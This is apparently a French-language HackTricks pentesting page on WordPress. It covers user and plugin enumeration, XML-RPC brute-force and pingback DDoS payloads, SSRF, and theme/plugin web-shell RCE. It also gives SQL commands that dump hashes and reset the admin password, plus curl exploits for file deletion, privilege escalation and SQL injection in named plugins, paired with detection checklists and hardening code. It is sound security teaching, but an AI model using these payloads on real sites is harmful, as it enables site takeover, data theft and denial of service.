# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- Les fichiers **t√©l√©charg√©s** vont √† : `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- Les fichiers **de th√®mes peuvent √™tre trouv√©s dans /wp-content/themes/,** donc si vous modifiez un php du th√®me pour obtenir RCE, vous utiliserez probablement ce chemin. Par exemple : En utilisant le **th√®me twentytwelve**, vous pouvez **acc√©der** au fichier **404.php** dans : [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Une autre URL utile pourrait √™tre : [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Dans **wp-config.php**, vous pouvez trouver le mot de passe root de la base de donn√©es.
- Chemins de connexion par d√©faut √† v√©rifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Fichiers principaux de WordPress**

- `index.php`
- `license.txt` contient des informations utiles telles que la version de WordPress install√©e.
- `wp-activate.php` est utilis√© pour le processus d'activation par e-mail lors de la configuration d'un nouveau site WordPress.
- Dossiers de connexion (peuvent √™tre renomm√©s pour se cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier qui repr√©sente une fonctionnalit√© de WordPress qui permet de transmettre des donn√©es avec HTTP agissant comme m√©canisme de transport et XML comme m√©canisme d'encodage. Ce type de communication a √©t√© remplac√© par le [REST API](https://developer.wordpress.org/rest-api/reference) de WordPress.
- Le dossier `wp-content` est le r√©pertoire principal o√π les plugins et th√®mes sont stock√©s.
- `wp-content/uploads/` est le r√©pertoire o√π tous les fichiers t√©l√©charg√©s sur la plateforme sont stock√©s.
- `wp-includes/` est le r√©pertoire o√π les fichiers principaux sont stock√©s, tels que les certificats, les polices, les fichiers JavaScript et les widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et sup√©rieures, WordPress g√©n√®re un fichier XML de plan de site avec tous les articles publics et les types d'articles et taxonomies interrogeables publiquement.

**Post exploitation**

- Le fichier `wp-config.php` contient des informations requises par WordPress pour se connecter √† la base de donn√©es, telles que le nom de la base de donn√©es, l'h√¥te de la base de donn√©es, le nom d'utilisateur et le mot de passe, les cl√©s d'authentification et les sels, et le pr√©fixe de la table de la base de donn√©es. Ce fichier de configuration peut √©galement √™tre utilis√© pour activer le mode DEBUG, ce qui peut √™tre utile pour le d√©pannage.

### Permissions des utilisateurs

- **Administrateur**
- **√âditeur** : Publie et g√®re ses propres articles et ceux des autres
- **Auteur** : Publie et g√®re ses propres articles
- **Contributeur** : √âcrit et g√®re ses articles mais ne peut pas les publier
- **Abonn√©** : Parcourt les articles et √©dite son profil

## **√ânum√©ration passive**

### **Obtenir la version de WordPress**

V√©rifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

√Ä l'int√©rieur du **code source** de la page (exemple de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Fichiers de lien CSS

![](<../../images/image (533).png>)

- Fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtenir des th√®mes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## √ânum√©ration active

### Plugins et Th√®mes

Vous ne pourrez probablement pas trouver tous les Plugins et Th√®mes possibles. Pour les d√©couvrir tous, vous devrez **forcer activement une liste de Plugins et Th√®mes** (esp√©rons-le pour nous, il existe des outils automatis√©s qui contiennent ces listes).

### Utilisateurs

- **ID Brute :** Vous obtenez des utilisateurs valides d'un site WordPress en for√ßant les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la r√©ponse est **400**, alors l'id est **invalide**.

- **wp-json :** Vous pouvez √©galement essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre point de terminaison `/wp-json/` qui peut r√©v√©ler des informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que ce point de terminaison n'expose que les utilisateurs qui ont fait un post. **Seules les informations sur les utilisateurs ayant cette fonctionnalit√© activ√©e seront fournies**.

Notez √©galement que **/wp-json/wp/v2/pages** pourrait leak des adresses IP.

- **√ânum√©ration des noms d'utilisateur de connexion** : Lors de la connexion √† **`/wp-login.php`**, le **message** est **diff√©rent** selon que le **nom d'utilisateur existe ou non**.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer une attaque par force brute sur les identifiants ou l'utiliser pour lancer des attaques DoS sur d'autres ressources. (Vous pouvez automatiser ce processus[ en utilisant ceci](https://github.com/relarizky/wpxploit) par exemple).

Pour voir s'il est actif, essayez d'acc√©der √† _**/xmlrpc.php**_ et envoyez cette requ√™te :

**V√©rifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce des identifiants**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes qui peuvent √™tre utilis√©es pour bruteforcer des identifiants. Si vous pouvez en trouver un, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Nom d'utilisateur ou mot de passe incorrect"_ dans une r√©ponse de code 200 doit appara√Ætre si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les identifiants corrects, vous pouvez t√©l√©charger un fichier. Dans la r√©ponse, le chemin appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe √©galement un **moyen plus rapide** de forcer les identifiants en utilisant **`system.multicall`** car vous pouvez essayer plusieurs identifiants dans la m√™me requ√™te :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Contourner 2FA**

Cette m√©thode est destin√©e aux programmes et non aux humains, et est ancienne, donc elle ne prend pas en charge 2FA. Donc, si vous avez des identifiants valides mais que l'entr√©e principale est prot√©g√©e par 2FA, **vous pourriez √™tre en mesure d'abuser de xmlrpc.php pour vous connecter avec ces identifiants en contournant 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions que vous pouvez faire via la console, mais vous pourriez tout de m√™me √™tre en mesure d'atteindre RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ou scan de port**

Si vous pouvez trouver la m√©thode _**pingback.ping**_ dans la liste, vous pouvez faire en sorte que Wordpress envoie une requ√™te arbitraire √† n'importe quel h√¥te/port.\
Cela peut √™tre utilis√© pour demander √† **des milliers** de **sites** Wordpress d'**acc√©der** √† un **emplacement** (ce qui provoque un **DDoS** √† cet emplacement) ou vous pouvez l'utiliser pour faire en sorte que **Wordpress** **scanne** un **r√©seau** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Jetez un ≈ìil √† l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode pour provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Lorsque ce fichier est **acc√©d√©**, une requ√™te MySQL "**lourde**" est effectu√©e, il pourrait donc √™tre utilis√© par des **attaquants** pour **causer** un **DoS**.\
De plus, par d√©faut, le `wp-cron.php` est appel√© √† chaque chargement de page (chaque fois qu'un client demande une page Wordpress), ce qui, sur des sites √† fort trafic, peut causer des probl√®mes (DoS).

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er un v√©ritable cronjob sur l'h√¥te qui effectue les actions n√©cessaires √† intervalles r√©guliers (sans causer de probl√®mes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'acc√©der √† _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Wordpress pourrait vous faire une requ√™te.

Voici la r√©ponse lorsque cela ne fonctionne pas :

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil v√©rifie si le **methodName: pingback.ping** et pour le chemin **/wp-json/oembed/1.0/proxy** existent, et s'ils existent, il essaie de les exploiter.

## Outils Automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Acc√©der en √©crasant un bit

Plus qu'une v√©ritable attaque, c'est une curiosit√©. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man), vous pouviez inverser 1 bit de n'importe quel fichier wordpress. Ainsi, vous pouviez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour NOP l'op√©ration NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifier un php du th√®me utilis√© (identifiants administratifs n√©cessaires)**

Apparence ‚Üí √âditeur de th√®me ‚Üí Mod√®le 404 (√† droite)

Changez le contenu pour un shell php :

![](<../../images/image (384).png>)

Recherchez sur internet comment acc√©der √† cette page mise √† jour. Dans ce cas, vous devez acc√©der ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

Il peut √™tre possible de t√©l√©charger des fichiers .php en tant que plugin.\
Cr√©ez votre backdoor php en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

T√©l√©chargez le plugin et appuyez sur Installer maintenant :

![](<../../images/image (249).png>)

Cliquez sur Proc√©der :

![](<../../images/image (70).png>)

Probablement, cela ne fera apparemment rien, mais si vous allez dans M√©dias, vous verrez votre shell t√©l√©charg√© :

![](<../../images/image (462).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter le reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette m√©thode implique l'installation d'un plugin malveillant connu pour √™tre vuln√©rable et pouvant √™tre exploit√© pour obtenir un web shell. Ce processus est r√©alis√© via le tableau de bord WordPress comme suit :

1. **Acquisition du plugin** : Le plugin est obtenu √† partir d'une source comme Exploit DB comme [**ici**](https://www.exploit-db.com/exploits/36374).
2. **Installation du plugin** :
- Acc√©dez au tableau de bord WordPress, puis allez √† `Tableau de bord > Plugins > T√©l√©charger le plugin`.
- T√©l√©chargez le fichier zip du plugin t√©l√©charg√©.
3. **Activation du plugin** : Une fois le plugin install√© avec succ√®s, il doit √™tre activ√© via le tableau de bord.
4. **Exploitation** :
- Avec le plugin "reflex-gallery" install√© et activ√©, il peut √™tre exploit√© car il est connu pour √™tre vuln√©rable.
- Le framework Metasploit fournit un exploit pour cette vuln√©rabilit√©. En chargeant le module appropri√© et en ex√©cutant des commandes sp√©cifiques, une session meterpreter peut √™tre √©tablie, accordant un acc√®s non autoris√© au site.
- Il est not√© que ceci n'est qu'une des nombreuses m√©thodes pour exploiter un site WordPress.

Le contenu comprend des aides visuelles d√©crivant les √©tapes dans le tableau de bord WordPress pour installer et activer le plugin. Cependant, il est important de noter que l'exploitation de vuln√©rabilit√©s de cette mani√®re est ill√©gale et contraire √† l'√©thique sans autorisation appropri√©e. Ces informations doivent √™tre utilis√©es de mani√®re responsable et uniquement dans un contexte l√©gal, comme le pentesting avec autorisation explicite.

**Pour des √©tapes plus d√©taill√©es, consultez :** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script con√ßu pour escalader une vuln√©rabilit√© **Cross-Site Scripting (XSS)** √† **Remote Code Execution (RCE)** ou d'autres vuln√©rabilit√©s critiques dans WordPress. Pour plus d'infos, consultez [**ce post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il fournit **un support pour les versions de WordPress 6.X.X, 5.X.X et 4.X.X et permet de :**
- _**Escalade de privil√®ges :**_ Cr√©e un utilisateur dans WordPress.
- _**(RCE) T√©l√©chargement de plugin personnalis√© (backdoor) :**_ T√©l√©chargez votre plugin personnalis√© (backdoor) dans WordPress.
- _**(RCE) √âdition de plugin int√©gr√© :**_ √âditez des plugins int√©gr√©s dans WordPress.
- _**(RCE) √âdition de th√®me int√©gr√© :**_ √âditez des th√®mes int√©gr√©s dans WordPress.
- _**(Personnalis√©) Exploits personnalis√©s :**_ Exploits personnalis√©s pour des plugins/th√®mes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe administrateur :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest des Plugins Wordpress

### Surface d'Attaque

Savoir comment un plugin Wordpress peut exposer des fonctionnalit√©s est essentiel pour trouver des vuln√©rabilit√©s dans son fonctionnement. Vous pouvez d√©couvrir comment un plugin pourrait exposer des fonctionnalit√©s dans les points suivants et quelques exemples de plugins vuln√©rables dans [**cet article de blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

L'une des fa√ßons dont un plugin peut exposer des fonctions aux utilisateurs est via des gestionnaires AJAX. Ceux-ci pourraient contenir des bogues de logique, d'autorisation ou d'authentification. De plus, il est assez fr√©quent que ces fonctions basent √† la fois l'authentification et l'autorisation sur l'existence d'un nonce Wordpress que **tout utilisateur authentifi√© dans l'instance Wordpress pourrait avoir** (ind√©pendamment de son r√¥le).

Ce sont les fonctions qui peuvent √™tre utilis√©es pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend le point de terminaison accessible √† tous les utilisateurs (m√™me ceux non authentifi√©s).**

> [!CAUTION]
> De plus, si la fonction v√©rifie simplement l'autorisation de l'utilisateur avec la fonction `wp_verify_nonce`, cette fonction v√©rifie seulement si l'utilisateur est connect√©, elle ne v√©rifie g√©n√©ralement pas le r√¥le de l'utilisateur. Ainsi, des utilisateurs √† faible privil√®ge pourraient avoir acc√®s √† des actions √† haut privil√®ge.

- **REST API**

Il est √©galement possible d'exposer des fonctions de WordPress en enregistrant une API REST √† l'aide de la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est un rappel √† une fonction qui v√©rifie si un utilisateur donn√© est autoris√© √† appeler la m√©thode API.

**Si la fonction int√©gr√©e `__return_true` est utilis√©e, elle ignorera simplement la v√©rification des permissions de l'utilisateur.**

- **Acc√®s direct au fichier php**

Bien s√ªr, Wordpress utilise PHP et les fichiers √† l'int√©rieur des plugins sont directement accessibles depuis le web. Donc, dans le cas o√π un plugin expose une fonctionnalit√© vuln√©rable qui est d√©clench√©e simplement en acc√©dant au fichier, elle sera exploitable par n'importe quel utilisateur.

### Suppression de fichiers arbitraires non authentifi√©e via wp_ajax_nopriv (Th√®me Litho <= 3.0)

Les th√®mes et plugins WordPress exposent fr√©quemment des gestionnaires AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsque la variante **_nopriv_** est utilis√©e, **le rappel devient accessible par des visiteurs non authentifi√©s**, donc toute action sensible doit √©galement mettre en ≈ìuvre :

1. Une **v√©rification de capacit√©** (par exemple `current_user_can()` ou au moins `is_user_logged_in()`), et
2. Un **nonce CSRF** valid√© avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. Une **sanitisation / validation stricte des entr√©es**.

Le th√®me multipurpose Litho (< 3.1) a oubli√© ces 3 contr√¥les dans la fonctionnalit√© *Remove Font Family* et a fini par exp√©dier le code suivant (simplifi√©) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Probl√®mes introduits par ce snippet :

* **Acc√®s non authentifi√©** ‚Äì le hook `wp_ajax_nopriv_` est enregistr√©.
* **Pas de v√©rification de nonce / de capacit√©** ‚Äì tout visiteur peut acc√©der √† l'endpoint.
* **Pas de sanitisation de chemin** ‚Äì la cha√Æne `fontfamily` contr√¥l√©e par l'utilisateur est concat√©n√©e √† un chemin de syst√®me de fichiers sans filtrage, permettant un parcours classique `../../`.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou r√©pertoire **en dessous du r√©pertoire de base des uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requ√™te HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre s√©quences `../` suffisent sur une installation par d√©faut. Supprimer `wp-config.php` force WordPress √† entrer dans l'*assistant d'installation* lors de la prochaine visite, permettant une prise de contr√¥le compl√®te du site (l'attaquant fournit simplement une nouvelle configuration de base de donn√©es et cr√©e un utilisateur administrateur).

D'autres cibles impactantes incluent les fichiers `.php` de plugins/th√®mes (pour contourner les plugins de s√©curit√©) ou les r√®gles `.htaccess`.

#### Liste de v√©rification de d√©tection

* Tout rappel `add_action( 'wp_ajax_nopriv_...')` qui appelle des helpers de syst√®me de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concat√©nation d'entr√©es utilisateur non assainies dans des chemins (recherchez `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et `current_user_can()`/`is_user_logged_in()`.

#### Renforcement
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Toujours** traiter toute op√©ration d'√©criture/suppression sur le disque comme privil√©gi√©e et v√©rifier deux fois :
> ‚Ä¢ Authentification  ‚Ä¢ Autorisation  ‚Ä¢ Nonce  ‚Ä¢ Assainissement des entr√©es  ‚Ä¢ Contention de chemin (par exemple via `realpath()` plus `str_starts_with()`).

---

### Escalade de privil√®ges via la restauration de r√¥le obsol√®te et l'autorisation manquante (ASE "Voir Admin en tant que R√¥le")

De nombreux plugins impl√©mentent une fonctionnalit√© "voir en tant que r√¥le" ou de changement de r√¥le temporaire en sauvegardant le(s) r√¥le(s) original(aux) dans les m√©tadonn√©es utilisateur afin qu'ils puissent √™tre restaur√©s plus tard. Si le chemin de restauration repose uniquement sur des param√®tres de requ√™te (par exemple, `$_REQUEST['reset-for']`) et une liste maintenue par le plugin sans v√©rifier les capacit√©s et un nonce valide, cela devient une escalade de privil√®ges verticale.

Un exemple du monde r√©el a √©t√© trouv√© dans le plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La branche de r√©initialisation restaurait les r√¥les en fonction de `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni une v√©rification `current_user_can()` ni une v√©rification de nonce avant de supprimer les r√¥les actuels et de r√©ajouter les r√¥les sauvegard√©s des m√©tadonn√©es utilisateur `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c'est exploitable

- Fait confiance √† `$_REQUEST['reset-for']` et √† une option de plugin sans autorisation c√¥t√© serveur.
- Si un utilisateur avait pr√©c√©demment des privil√®ges plus √©lev√©s enregistr√©s dans `_asenha_view_admin_as_original_roles` et a √©t√© r√©trograd√©, il peut les restaurer en acc√©dant au chemin de r√©initialisation.
- Dans certaines d√©ploiements, tout utilisateur authentifi√© pourrait d√©clencher une r√©initialisation pour un autre nom d'utilisateur toujours pr√©sent dans `viewing_admin_as_role_are` (autorisation rompue).

Pr√©requis √† l'attaque

- Version de plugin vuln√©rable avec la fonctionnalit√© activ√©e.
- Le compte cible a un r√¥le de haute privil√®ge obsol√®te stock√© dans les m√©tadonn√©es utilisateur d'une utilisation ant√©rieure.
- Toute session authentifi√©e ; nonce/capacit√© manquante dans le flux de r√©initialisation.

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les versions vuln√©rables, cela supprime les r√¥les actuels et r√©ajoute les r√¥les originaux sauvegard√©s (par exemple, `administrator`), ce qui permet d'escalader les privil√®ges.

Liste de v√©rification de d√©tection

- Recherchez des fonctionnalit√©s de changement de r√¥le qui persistent les ‚Äúr√¥les originaux‚Äù dans les m√©tadonn√©es utilisateur (par exemple, `_asenha_view_admin_as_original_roles`).
- Identifiez les chemins de r√©initialisation/restauration qui :
  - Lisent les noms d'utilisateur √† partir de `$_REQUEST` / `$_GET` / `$_POST`.
  - Modifient les r√¥les via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
  - Autorisent en fonction d'un tableau d'options de plugin (par exemple, `viewing_admin_as_role_are`) au lieu des capacit√©s de l'acteur.

Renforcement

- Appliquez des v√©rifications de capacit√© sur chaque branche modifiant l'√©tat (par exemple, `current_user_can('manage_options')` ou plus strict).
- Exigez des nonces pour toutes les mutations de r√¥le/permission et v√©rifiez-les : `check_admin_referer()` / `wp_verify_nonce()`.
- Ne faites jamais confiance aux noms d'utilisateur fournis par la requ√™te ; r√©solvez l'utilisateur cible c√¥t√© serveur en fonction de l'acteur authentifi√© et d'une politique explicite.
- Invalidez l'√©tat des ‚Äúr√¥les originaux‚Äù lors des mises √† jour de profil/r√¥le pour √©viter la restauration de privil√®ges √©lev√©s obsol√®tes :
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Envisagez de stocker un √©tat minimal et d'utiliser des jetons temporaires, prot√©g√©s par des capacit√©s, pour des changements de r√¥le temporaires.

---

## Protection de WordPress

### Mises √† jour r√©guli√®res

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. Confirmez √©galement que la mise √† jour automatique est activ√©e dans wp-config.php :
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Aussi, **n'installez que des plugins et th√®mes WordPress fiables**.

### Plugins de s√©curit√©

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur **admin** par d√©faut
- Utilisez des **mots de passe forts** et **2FA**
- **R√©visez** p√©riodiquement les **permissions** des utilisateurs
- **Limitez les tentatives de connexion** pour pr√©venir les attaques par force brute
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'acc√®s qu'en interne ou depuis certaines adresses IP.


### Injection SQL non authentifi√©e via validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal a expos√© une t√¢che **savecategory** qui ex√©cute finalement le code vuln√©rable suivant √† l'int√©rieur de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduites par ce snippet :

1. **Entr√©e utilisateur non assainie** ‚Äì `parentid` provient directement de la requ√™te HTTP.
2. **Concat√©nation de cha√Ænes √† l'int√©rieur de la clause WHERE** ‚Äì pas de `is_numeric()` / `esc_sql()` / instruction pr√©par√©e.
3. **Accessibilit√© non authentifi√©e** ‚Äì bien que l'action soit ex√©cut√©e via `admin-post.php`, la seule v√©rification en place est un **nonce CSRF** (`wp_verify_nonce()`), que tout visiteur peut r√©cup√©rer depuis une page publique int√©grant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. R√©cup√©rer un nonce frais :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter un SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La r√©ponse divulgue le r√©sultat de la requ√™te inject√©e ou modifie la base de donn√©es, prouvant SQLi.


### T√©l√©chargement de fichiers arbitraires non authentifi√© / Travers√©e de chemin (WP Job Portal <= 2.3.2)

